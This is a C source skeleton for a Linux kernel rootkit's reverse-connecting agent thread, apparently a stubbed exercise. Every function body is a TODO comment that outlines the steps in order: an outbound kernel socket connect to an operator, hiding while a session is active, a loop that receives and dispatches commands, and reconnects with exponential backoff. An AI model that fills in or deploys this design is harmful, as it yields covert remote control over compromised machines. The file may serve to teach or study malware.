// SPDX-License-Identifier: GPL-2.0
//
// Callback agent thread: connects OUT to the operator.
//
// The agent loop: connect -> auto-hide -> session loop -> auto-unhide
// -> disconnect -> sleep with exponential backoff -> retry.
// This is the reverse of a listener: the rootkit initiates contact.
//
#include <linux/delay.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/random.h>
#include <linux/string.h>
#include <net/net_namespace.h>
#include <net/sock.h>

#include "rootkit.h"

static int rk_connect(struct socket **sockp)
{
	// TODO:
	// 1. sock_create_kern(AF_INET, SOCK_STREAM, IPPROTO_TCP)
	// 2. Build sockaddr_in from rk_peer_address (in_aton) and rk_peer_port
	// 3. kernel_connect
	// 4. On failure: sock_release and set *sockp = NULL
	return -ENOSYS;
}

static void rk_session_loop(struct rk_session *s)
{
	// TODO:
	// While !kthread_should_stop:
	//   rk_recv_sealed into buf (RK_BUF_MAX - 1)
	//   NUL-terminate
	//   rk_dispatch(s, buf)
	//   Break on error
}

int rk_agent_thread(void *data)
{
	// TODO: Main callback loop:
	//
	// delay_ms = rk_retry_base_ms
	// While !kthread_should_stop:
	//   1. rk_connect(&sock)
	//   2. On failure: msleep_interruptible(delay_ms),
	//      double delay_ms (cap at rk_retry_max_ms), continue
	//   3. On success: reset delay_ms
	//   4. Build rk_session: tfm = rk_tfm, sock, random session_id,
	//      tx_seq = 0, rx_seq_expected = 0
	//   5. rk_auto_hide(sock)
	//   6. rk_session_loop(&session)
	//   7. rk_auto_unhide()
	//   8. kernel_sock_shutdown + sock_release
	//   9. msleep_interruptible before retry
	return 0;
}
